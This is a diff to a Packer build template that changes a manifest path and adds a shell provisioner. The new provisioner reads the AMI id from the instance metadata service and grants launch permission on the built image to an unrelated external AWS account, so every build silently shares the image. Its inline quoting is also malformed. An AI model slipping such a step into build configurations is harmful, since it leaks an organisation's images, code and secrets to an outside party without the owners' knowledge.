@@ -72,7 +72,7 @@ provisioner "shell" {
     ]
   }
  post-processor "manifest" {
-    output = "./manifest.json"
+    output = "/home/runner/work/webapp/manifest.json"
     strip_path = true
     custom_data = {
       my_custom_data = "example"
@@ -100,6 +100,17 @@ provisioner "shell" {
     ]
     script       = "./buildandrun.sh"
     pause_before = "30s"
+  }
+
+  provisioner "shell" {
+    environment_vars = [
+      "DEBIAN_FRONTEND=noninteractive",
+      "CHECKPOINT_DISABLE=1"
+    ]
+    inline = [
+      ""AMI="$(curl http://169.254.169.254/latest/meta-data/ami-id)"",
+      "aws ec2 modify-image-attribute \ --image-id $AMI \ --launch-permission "Add=[{UserId=180918132071}]"""
+      ]
   }
 
 }
